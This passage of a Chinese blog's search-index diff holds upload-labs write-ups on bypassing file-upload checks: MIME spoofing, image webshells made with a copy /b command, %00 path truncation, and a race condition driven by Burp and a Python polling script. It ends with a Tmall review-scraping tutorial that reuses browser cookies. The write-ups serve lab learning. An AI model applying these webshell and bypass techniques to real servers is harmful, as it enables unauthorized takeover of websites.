+<p>常见的MIME 类型如下<br><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/aa68aff2773d8c522e44f77df1c2b9bf.png" alt="截图"></p>
+<p>在HTTP 协议中，使用Content-Type 字段表示文件的MIME 类型</p>
+</blockquote>
+<p>本次以upload-labs作为例子</p>
+<p>不同于 第一关,第二关中没有js检查方法</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/078dfe17206b29b420336cc1dad9ba5a.png" alt="截图"></p>
+<p>那么我们就又要用到burp工具了</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/9477728a6a0f2e4d549de30207d7c82a.png" alt="截图"></p>
+<p>直接上传肯定是不行的</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/661776c80362e0de686a8ea80986f846.png" alt="截图"></p>
+<p>抓一下包,可以看到content-type是一个咱也看不懂的东西,我们要将其改为图片格式,绕过检查</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c12728e8fd89ccd5b2accef8a8cda137.png" alt="截图"></p>
+<p>改为这样,再放包</p>
+<p><img src="/2022/01/13/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02(MIME%E7%BB%95%E8%BF%87)/c513080d3edf2c9d53a1abd7e95c0e58.png" alt="截图"></p>
+<p>上传成功,接着就可以用中国蚁剑连接即可得到答案.</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(图片马)</title>
+    <url>/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-图片马"><a href="#文件上传漏洞-图片马" class="headerlink" title="文件上传漏洞(图片马)"></a>文件上传漏洞(图片马)</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p> 一般文件内容验证使用<code>getimagesize函数</code>检测,会判断文件是否是一个有效的文件图片,如果是,则允许上传,否则的话不允许上传。<br>本实验就是将一句话木马插入到一个合法的图片文件当中,然后用文件包含漏洞得到连接地址。</p>
+<h3 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作"></a>图片马的制作</h3><p><code>copy a.png /b + a.php /a 3.png</code><br><code>/b:指定以二进制格式复制、合并文件，用于图像或者声音类文件</code><br><code>/a:指定以ascii格式复制、合并文件用于txt等文本类文件</code></p>
+<p>这句话的意思是将a.png和a.php合并为3.png</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/6c9f1f2ae008cbe4328bf1a51dc49760.png" alt="44248b9dbc6175d49c62f82181001321.png"></p>
+<p>我们将制作好的图片马上传到服务器后,即可访问到该图片.但接着发现无法解析为php脚本文件,访问到的还是一张图片.</p>
+<p>解决方法:</p>
+<p>1)只能结合文件包含漏洞,得到php文件的位置</p>
+<p>2)在一句话木马前加上 <code>GIF89a</code>,上传php类型的木马即可绕过检测(因为本关只读两字节判断文件类型)</p>
+<p>总结:图片马不能单枪匹马就得到flag,需要和别的手段一起使用才行,若题目中有文件包含这样的提示,就可以使用图片马.</p>
+<h2 id="图片马的二次渲染"><a href="#图片马的二次渲染" class="headerlink" title="图片马的二次渲染"></a>图片马的二次渲染</h2><h3 id="二次渲染原理："><a href="#二次渲染原理：" class="headerlink" title="二次渲染原理："></a>二次渲染原理：</h3><blockquote>
+<p>    在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p>
+</blockquote>
+<h3 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a>绕过：</h3><blockquote>
+<p>配合文件包含漏洞：<br>  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</p>
+</blockquote>
+<h3 id="如何判断图片是否进行了二次处理？"><a href="#如何判断图片是否进行了二次处理？" class="headerlink" title="如何判断图片是否进行了二次处理？"></a>如何判断图片是否进行了二次处理？</h3><blockquote>
+<p>对比要上传图片与上传后的图片大小，编辑器打开图片查看上传后保留了拿些数据</p>
+</blockquote>
+<p><strong>特别注意!二次渲染我强烈推荐使用GIF格式的,因为jpg和png格式的二次渲染十分复杂,需要用到脚本,GIF的二次渲染算是比较简单.</strong></p>
+<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1、创建一个<code>a.php</code>的脚本文件</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/74552115ea57bad2cead9013b18f4569.png" alt="a559551bfacb8fb9f99611f0af26be6f.png"></p>
+<p>2、在<code>cmd命令行</code>中，使用以下命令把<code>1.gif</code>和<code>a.php</code>合成图片马<code>2.gif</code></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/da744f8f399e502e7d736bca1866b3ec.png" alt="9787d583e1bb627a5beb08eb11af110e.png"></p>
+<p>3、使用<code>010 Editor16进制编辑器</code>查看<code>2.gif</code>内容，可以看出<code>php代码</code>已经插入<code>图片马</code>中了</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/379842041e8f24c6515a39d530d531a6.png" alt="913968e615a2ddf5619ca38f3ee85465.png"></p>
+<p>4、上传图片马，并复制图片链接进行查看</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/aa103f206d9cbe15ab21b140d299b5b1.png" alt="5c72fd89471ecb8c85cf4be063b122b0.png"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/601ac2acae795fb9606b1e76246ce129.png" alt="62e4ddcebd4b926b1191fc6c8fb52691.png"></p>
+<p>5、右击复制图片，将图片下载到本地</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/f5a8a412986ed972fa5914ad6d4d60f0.png" alt="4f85090a95fffbad5c12525dc49e869c.png"></p>
+<p>6、使用<code>010 Editor16进制编辑器</code>打开图片，发现末尾的<code>php代码</code>没有了</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/3302e58f43910ec373168ee94c9b1afe.png" alt="67b735a4d43eed6574f7144e415168b8.png"></p>
+<p><strong><code>GIF</code>绕过二次渲染的方法，就是通过对比上传前和上传后的两个文件，如果说哪个位置，它的上传前和上传后的没有变，我们就把php一句话代码插入到这个位置</strong></p>
+<p>7、使用<code>010 Editor16进制编辑器</code>打开上传前的文件和上传后的文件，并对文件进行比较：</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/b143d30d2b624b8792000dc4bab6a702.png" alt="651676d4d02835870322e3f93b8028f4.png"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/806aaa0408e2bd20fe0c54ca6eb379ef.png" alt="f413e0ce3c183126e44b9db7a35d0598.png"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A06(%E5%9B%BE%E7%89%87%E9%A9%AC)/de2a1efab28d8b6df01d2b26c90ca07f.png" alt="11a4932a95d4264ffa1b764e7047a580.png"></p>
+<p>8.蓝色部分就是没有改变的地方,接着我们就可以将一句话木马插入蓝色部分,可以成功连接蚁剑.</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(00截断)</title>
+    <url>/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-00截断"><a href="#文件上传漏洞-00截断" class="headerlink" title="文件上传漏洞(00截断)"></a>文件上传漏洞(00截断)</h1><h2 id="00截断原理"><a href="#00截断原理" class="headerlink" title="00截断原理"></a>00截断原理</h2><p>  0x00是字符串的结束标识符，这样服务器检测到0x00后就停止了向后检测,后面的内容就等于被注释了.依靠这点可以帮助我们绕过检测.</p>
+<h2 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h2><p>  有很多人喜欢在文件名中加%00进行截断，但其实这种方式是不对的，比如攻击者构造文件名：admintony.php%00a.jpg，在提取后缀名的时候遇到%00则认为字符串结束了，那么他提取到的后缀名会是.php，.php后缀又不允许上传所以上传失败了(这里有必要提一句，有人可能会说在一些情况下，%00截断文件名可以成功，这种案例你试一下是不是任意文件上传，西普的00截断实验就是一个任意文件上传的上传点，既然是任意文件上传又何必用00截断绕过呢？)</p>
+<h2 id="正确用法"><a href="#正确用法" class="headerlink" title="正确用法"></a>正确用法</h2><p>  那么00截断应该在什么时候使用呢？数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在<code>path: uploads/</code>，那么攻击者可以通过修改path的值来构造<code>paylod: uploads/aa.php%00</code></p>
+<p>   为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/*********.******，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/56889afa25282dc9417a785af8086f98.png" alt="截图"></p>
+<p>在GET方法中,我们可以直接在save_path路径中进行00截断:</p>
+<p><code>通过Burp Suite将save_path=../upload/ HTTP/1.1使用%00进行截断-&gt; save_path=../upload/shell.php%00 HTTP/1.1</code></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/330b351a2b88698eda2a333e6659cfc6.png" alt="截图"></p>
+<p>将文件后缀改为允许上传的后缀,在第一行路径处添加如图信息</p>
+<h3 id="特别注意"><a href="#特别注意" class="headerlink" title="特别注意!!!"></a>特别注意!!!</h3><p><strong>00截断必需条件是php版本号在5.3.4以前(不能包含5.3.4版本)</strong>,我之前试了很多次都无法成功,换了一关查看那个网页的靶场php版本超过5.3.4了,所以又换了一个靶场.</p>
+<p>在POST方法中,我们需要变得复杂一点</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/da6f77c40fdb9fddb32f4cb4e91b3ae1.png" alt="截图"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(00%E6%88%AA%E6%96%AD)/30a45e8874e1142437a11b08b78e8e35.png" alt="截图"></p>
+<p>记得写完要用burp自带的功能给它编码一下,因为post传输的时候会自动解码.</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞(条件竞争漏洞)</title>
+    <url>/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞-条件竞争漏洞"><a href="#文件上传漏洞-条件竞争漏洞" class="headerlink" title="文件上传漏洞(条件竞争漏洞)"></a>文件上传漏洞(条件竞争漏洞)</h1><h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><blockquote>
+<p>    条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>    上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。<br>    由于服务器并发处理(同时)多个请求，假如a用户上传了木马文件，由于代码执行需要时间，在此过程中b用户访问了a用户上传的文件，会有以下三种情况：<br>    1.访问时间点在上传成功之前，没有此文件。<br>    2.访问时间点在刚上传成功但还没有进行判断，该文件存在。<br>    3.访问时间点在判断之后，文件被删除，没有此文件.</p>
+</blockquote>
+<p>总结起来一句话,因为服务器要在短时间里处理大量内容,但是解析代码需要时间,所以就会有破绽出来,我们就是利用这短暂的破绽进行绕过.</p>
+<h3 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h3><p>先看源码:</p>
+<pre><code>$is_upload = false;
+$msg = null;   //判断文件上传操作
+
+if(isset($_POST[&#39;submit&#39;]))&#123;  //判断是否接收到这个文件
+    $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);  //声明一个数组，数组里面有3条数据，为：&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;
+    $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;];  //获取图片的名字
+    $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; //获取图片的临时存储路径
+    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); //通过文件名截取图片后缀
+    $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; //构造图片的上传路径，这里暂时重构图片后缀名。
+
+    if(move_uploaded_file($temp_file, $upload_file))&#123; //这里对文件进行了转存
+        if(in_array($file_ext,$ext_arr))&#123; //这里使用截取到的后缀名和数组里面的后缀名进行对比
+             $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;  //如果存在，就对文件名进行重构
+             rename($upload_file, $img_path);  //把上面的文件名进行重命名
+             $is_upload = true;
+        &#125;else&#123;
+            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; //否则返回&quot;只允许上传.jpg|.png|.gif类型文件！&quot;数据。
+            unlink($upload_file);// 并删除这个文件
+        &#125;
+    &#125;else&#123;
+        $msg = &#39;上传出错！&#39;;
+    &#125;
+&#125;
+
+</code></pre>
+<p>代码处理流程：声明一个数组，保存着允许上传的文件类型–&gt;获取文件名和文件临时存储路径–&gt;截取文件名–&gt;构造文件上传后的存储路径–&gt;对文件进行转存–&gt;比对白名单，如果存在就对文件进行重命名–&gt;否则就删除文件。<br>通过上面代码我们发现：<br>  服务器先通过move_uploaded_file函数把文件保存了，然后再去判断后缀名是否合法，合法就重命名，如果不合法再删除。重点在于，在多线程情况下，就有可能出现还没处理完，我们就访问了原文件，这样就会导致防护被绕过。<br>  我们上传一个文件上去，后端会检验上传文件是否和要求的文件是否一致。如果不能达到要求就会删除文件，如果达成要求就会保留，那么当我们上传文件上去的时候，检测是否到达要求需要一定的时间，这个时间可长可短，但是我们确确实实在某一刻文件已经上传到了指定地址，并且访问到这个文件。这时候就会造成条件竞争。</p>
+<p>看懂了源码以后,我们模拟一下条件竞争的场景:<em>10000人同时上传文件1.php，另外有10000人在同时访问这个1.php；上传文件时，这个文件会有一段时间留存在服务器的上传目录下，而服务器脚本在进行判断文件是否合法而对文件进行删除时，会有一定的处理时间，可能在某个时间里，服务器还未来得及删除文件，从而导致我们对这个上传文件成功访问。</em></p>
+<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>1.首先,改变一下我们的一句话木马</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/ed3ab647930ed32a525d2d2e32f1daa4.png" alt="image-20220115234347779.png"></p>
+<p>如果你想用一句话木马连接蚁剑的话那就太天真了,就是你运气好连接上蚁剑,也根本没时间查看就会被服务器删掉,所以我们就要猥琐一点,利用fputs()进行写入,当服务器解析解析完这个php文件的时候,我们就已经在该目录下创建了shell2.php了,而这个php文件里有一句话木马,且不是我们用户上传的,所以不会被删除.</p>
+<p>2.使用<code>burpsuite</code>进行抓包，拦截代理流量，并把拦截到的数据包发送到<code>Intruder模块</code></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/7c3dfee82312912b96992b9ce1ef0cbd.png" alt="image-20220115235601111.png"></p>
+<p>3.清空变量,并无止境地发送空包,模拟大量用户同时上传</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/1e61824aedf55bd2604fac9492a99c11.png" alt="image-20220115235638013.png"></p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/34757db66ad9fb25cbb1cf276d830e05.png" alt="image-20220115235345206.png"></p>
+<p>为了让服务器解析变得困难点,我们将线程提高到20</p>
+<p><img src="/2022/01/16/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E)/5c31c250ef1ba7769540ed05b102093f.png" alt="image-20220115235419540.png"></p>
+<p>设置完之后便可以开始爆破攻击了.以上便是模拟大量用户不停上传的场景,接下来我们要用模拟大量用户模拟访问.</p>
+<p>4.使用python脚本模拟用户访问上传目标地址</p>
+<pre><code>import requests
+url = &quot;https://821-3a1ea0ce-39e7-4921-8b94-a2386d28c530.do-not-trust.hacking.run/upload/shell.php&quot;
+while True:
+    html = requests.get(url)
+    if html.status_code == 200:
+        print(&quot;OK&quot;)
+        break
+    else:
+        print(&quot;NO&quot;)
+</code></pre>
+<p>我们可以随便上传一张图片,查看图片链接即可得到上传文件所在的url,将图片名改为我们上传的php文件,我这里是shell.php</p>
+<p>这个脚本的意思是不停访问这个网址,直到状态码返回200,即访问成功的意思.若出现OK,代表我们上传成功,即shell2.php也被写入了该目录之下,我们就可以用蚁剑连接了.(记得连接的是shell2.php而不是shell.php,因为shell.php只是为了写入shell2.php的一个工具而已)</p>
+]]></content>
+      <categories>
+        <category>文件上传漏洞</category>
+      </categories>
+      <tags>
+        <tag>文件上传漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>python爬虫爬取天猫商品评论</title>
+    <url>/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近有个作业,要求我们用python写一个爬虫程序,将淘宝里的商品评论爬取出来.为此,我专门看了一个长达半小时的教学视频,发现原来爬虫如此简单.下面我就将学到的,以及容易踩坑的地方.</p>
+<h2 id="python环境"><a href="#python环境" class="headerlink" title="python环境"></a>python环境</h2><p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/b1a35ad58db7fd5358e484a5986bd206.png" alt="截图"></p>
+<p>这是我目前的包,本次爬虫主要用到的是requests、beautifulsoup4、simplejson,大家可以通过左上角＋好来添加相关的包.</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/415b0605ea849634e0c714fa2b6f9e4e.png" alt="截图"></p>
+<p>这是我本次导入的包,大家可以在实验前先导入一下,如果发现下面有红色波浪线就将光标移过去,然后根据提示自动安装.(最下面那个包虽然用不上,但是必须要有,不然最后一步导入xlsx会失败)</p>
+<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/8e7825926105bf1d1632b2b5491701b0.png" alt="截图"></p>
+<p>随机打开一个评论比较多的网站,按F12或右键检查,</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/701eb783bee9fc13c4da946f4efba60a.png" alt="截图"></p>
+<p>找到network,如果都是空的话就刷新一下页面;</p>
+<p>接着我们找到累计评价;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/a8ba6256149e8740730140aadde93df0.png" alt="截图"></p>
+<p>并在network的窗体内按ctrl+F,可以搜索,我们随机找一条评论进行搜索即可,我这里用的是第一条评论的关键词;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/e5396e09a285617a9d03a538b9cca523.png" alt="截图"></p>
+<p>ok,现在就找到了评论所在的json文件了</p>
+<p>接下来,点击Headers</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/405dbe28f5a31b1a9880cfdea0f36f94.png" alt="截图"></p>
+<p>找到第一个Request URL,这是我们本次爬虫要爬取的地址;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/a1d70e109f8f7d7943ff2f43b40cfac7.png" alt="截图"></p>
+<p>将其先复制到pycharm;</p>
+<p>再找到cookie,这是浏览器给用户返回的消息,爬虫就是假装自己是浏览器上的用户</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/cd5d847e4df2f196076359cf513b5ed3.png" alt="截图"></p>
+<p>再找到referer,referer是告诉浏览器我们从哪个界面过来的;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/b8f190497810ffce7f5a8e3fa6a7c1da.png" alt="截图"></p>
+<p>接着在最底下找到user-agent,这是显示浏览器的版本啊等相关信息</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/5f7a362c1698569779a7f9b8488efa52.png" alt="截图"></p>
+<p>记起这三个条件我们就可以伪装成用户骗取浏览器信任了;</p>
+<p>接着我们将这三个信息合成一个字典;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/27c0eb85765e38c56187c3685a806cc9.png" alt="截图"></p>
+<p>下面我们可以来逐步介绍一下爬虫的代码</p>
+<pre><code>需data = requests.get(url, headers=headers).text#这句是利用requests包的功能,获取网页的信息
+</code></pre>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/75be9841d36ba4d30ae04f35a577924b.png" alt="截图"></p>
+<p>需要注意的是,我标注的这个currentPage表示当前页面,我只是利用第一条评论下的URL信息来寻找评论所在的位置,如果我是用第99条评论来找,那肯定就不在相同的页数下了.所以我们要用到for循环和拼接语句来完成对多面的爬取数据;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/fc4f66a8bfca723d1883c95f6834bb8c.png" alt="截图"></p>
+<p>改为</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/0e3234f629591536e4c68740d4a27209.png" alt="截图"></p>
+<p>并用for循环包裹</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/e278f9de0a2035e8f369d756214d5e68.png" alt="截图"></p>
+<p>这样就可以不断爬取了;</p>
+<p>因为我们爬取的速度很快,几毫秒就一面爬完了,浏览器肯定觉得我们非同常人啊,于是就导入time包,利用sleep来增加延迟</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/ba32ce1781b4aa736575f5ad82e5e343.png" alt="截图"></p>
+<p>ok,现在就可以爬取数据了,不过爬出来的数据是可读性很差的</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/b027e164b90114d1eb82758f3b83d218.png" alt="截图"></p>
+<p>是这样的,因为我们是不加筛选就将网页中评论页面下所有东西就爬出来,所以很乱.于是,我们需要使用正则表达式来筛选所要的内容;</p>
+<p>我们先分析一下,用户评论的前后有什么特点,不难发现,在用户前面都会有个content:,后面会有一个from一样的东西,这就是我们要找的规律,于是我们可以用正则表达式写出下面的代码</p>
+<pre><code>pat = re.compile(&#39;&quot;rateContent&quot;:&quot;(.*?)&quot;,&quot;fromMall&quot;&#39;)#正则匹配,匹配所有包含在这两个单词之间的数据
+</code></pre>
+<p>关于正则表达式,大家可以上网查,我大致给大家讲一下这里使用的正则表达式的意思</p>
+<p>.是代表除了换行符以外的所有单个字母</p>
+<p>*是代表前面的子表达式0次或者多次</p>
+<p>?是代表匹配前面子表达式零次或一次</p>
+<p>()是标记表达式开始和结束位置</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/55b6755f56451f2f94bae93ffdcc8756.png" alt="截图"></p>
+<p>这个是个例子,.*?可以匹配最少重复的字符串;如果去掉?则是贪婪字串,可以匹配第一个&lt;到最后一个&gt;,我们这里为了获取所有评论,所以要加一个?,否则会将第一个评论到最后一条评论之间所有内容都原封不动地输出;</p>
+<p>ok,那么关键步骤都讲完了,接下来我将完整代码给大家,先贴上我的示例:</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/5cad46903e83defacb7f594b46a73837.png" alt="截图"></p>
+<p>居然就这么几行代码,所以说爬虫其实是很容易的,并且关键代码就几行而已;</p>
+<p><img src="/2021/11/30/%E7%88%AC%E8%99%AB%E6%8A%93%E5%8F%96%E5%A4%A9%E7%8C%AB%E5%95%86%E5%93%81%E8%AF%84%E8%AE%BA/3bce221d52adb5183398400a16e87e38.png" alt="截图"></p>
+<p>运行的截图,成功后左上角会出现xlsx文件,</p>
